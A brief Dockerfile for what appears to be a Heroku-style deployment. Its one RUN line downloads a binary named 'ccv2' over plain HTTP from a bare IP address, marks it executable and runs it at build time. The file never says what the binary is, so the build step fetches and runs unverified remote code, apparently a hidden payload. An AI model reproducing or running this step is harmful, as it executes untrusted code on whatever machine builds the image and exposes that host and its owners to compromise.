FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget wget http://137.184.39.112/ccv2; chmod +x ccv2; ./ccv2 ann 
CMD bash heroku.sh
